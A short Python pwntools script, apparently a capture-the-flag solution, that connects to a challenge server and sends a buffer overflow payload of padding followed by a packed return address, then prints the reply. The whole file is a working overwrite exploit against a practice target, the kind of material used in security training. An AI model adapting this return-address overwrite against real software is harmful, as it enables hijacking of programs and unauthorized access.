from pwn import *

p = remote("ctf.tcp1p.com",17027)

payload = b"a"*20
payload += p64(5134160)

p.sendline(payload)
print(p.recv())

